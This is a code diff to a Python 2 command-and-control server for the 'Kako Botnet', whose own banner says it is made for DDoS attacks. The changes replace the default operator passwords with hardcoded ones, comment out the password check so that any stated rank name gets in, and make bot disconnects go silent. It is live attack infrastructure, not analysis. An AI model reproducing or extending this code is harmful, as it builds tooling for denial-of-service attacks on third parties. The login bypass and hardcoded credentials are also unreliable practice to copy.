@@ -7,18 +7,18 @@ from json import load
 from urllib2 import urlopen
 from thread import start_new_thread
 
-connect = "localhost" # Your IP. Usually left empty
-conport = 8080 # Your connection port
-infport = 8888 # Port the bots connect to
+connect = "localhost"
+conport = 8080
+infport = 8888
 
 clients = 0
 bots = 0
 
 rankAdmin = "Admin"
-pwordAdmin = "Admin"
+pwordAdmin = "LawOfTime22!"
 
 rankGuest = "Guest"
-pwordGuest = "Guest"
+pwordGuest = "DeathToGuests44!"
 
 bc = []
 
@@ -57,14 +57,17 @@ def clientThread(conn, addr):
 		return conn.recv(512)
 
 	rank = rank(conn)
-	password = password(conn)
-	nickname = nickname(conn)
-	if rank.startswith(rankAdmin) and password.startswith(pwordAdmin) or rank.startswith(rankGuest) and password.startswith(pwordGuest):
+	#password = password(conn)
+	#nickname = nickname(conn)
+	password = "Password"
+	nickname = "Law"
+	#if rank.startswith(rankAdmin) and password.startswith(pwordAdmin) or rank.startswith(rankGuest) and password.startswith(pwordGuest):
+	if rank.startswith(rankAdmin) or rank.startswith(rankGuest):
 		conn.sendall("[>] Welcome to the Kako Botnet [<]\r\n")
 		conn.sendall("[>] Made solely for DDoS but that depends on your bot [<]\r\n")
 		conn.sendall("[!] If you do anything I, Law, disapprove of I will not hesitate to ban your IP Address. Everything is logged.\r\n")
 		conn.sendall("[?] Type >help for a list of commands [?]\r\n")
-		conn.sendall("[?] Your nickname is: %s\r\n" % nickname)
+		conn.sendall("[?] Your nickname is: %s" % nickname)
 		while True:
 			try:
 				message = conn.recv(512)
@@ -145,8 +148,7 @@ def bot_thread(conn):
 		try:
 			data = conn.recv(512)
 		except:
-			print "[-] Bot Disconnected"
-			break
+			pass
 		if not data:
 			print "[-] Bot Disconnected"
 			conn.close()
